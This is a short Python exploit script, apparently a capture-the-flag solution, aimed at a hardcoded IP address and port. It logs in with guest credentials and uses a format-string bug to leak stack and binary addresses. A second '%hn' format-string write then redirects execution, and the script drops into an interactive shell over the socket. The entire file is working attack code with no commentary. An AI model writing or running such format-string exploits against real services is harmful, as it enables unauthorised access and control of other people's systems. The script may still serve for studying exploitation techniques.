#!/usr/bin/env python
#coding: UTF-8

import os
import re
import sys
import time
import struct
import socket
import signal
import telnetlib
import subprocess

TARGET = ('202.112.28.116', 10910)

def e(s):
    return s.encode('UTF-8')

def d(s):
    return s.decode('UTF-8')

def p(d, fmt='<Q'):
    return struct.pack(fmt, d)

def u(d, fmt='<Q'):
    return struct.unpack(fmt, d)

def u1(d, fmt='<Q'):
    return u(d, fmt)[0]

def readtil(delim):
    buf = b''
    while not e(delim) in buf:
        buf += s.recv(1)
    return buf

def send(b):
    s.sendall(b)

def sendln(b):
    send(e(b) + b'\n')

def kill(process, sig=signal.SIGKILL):
    try:
        pid = int(subprocess.check_output(['pidof', process]))
    except:
        return
    os.kill(pid, sig)

def pwn():
    global s

    s = socket.create_connection(TARGET)
    readtil(': ')
    sendln('guest')
    readtil(': ')
    sendln('guest123')
    readtil(': ')
    sendln('2')
    readtil(':\n')
    sendln(0x100 * 'A')
    readtil(': ')
    sendln('4')
    readtil(': ')
    sendln('%1$lx %3$lx')
    readtil(': ')
    sendln('yolo')
    r = d(readtil('login failed')).split(' ')
    readtil(': ')
    
    base, md5 = int(r[0], 16), int(r[1], 16)
    base &= ~0xfff
    base -= 0x1000
    print("stack @ 0x{:x}".format(md5))
    print("binary @ 0x{:x}".format(base))
    target = base + 0xfb3
    val = target & 0xffff
    print("val = 0x{:x}".format(val))

    # offset 40
    sendln('%{}cX%40$hn'.format(val-1))
    readtil(': ')
    send(p(md5 - 8) + b'\n')
    readtil('X')

    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

pwn()
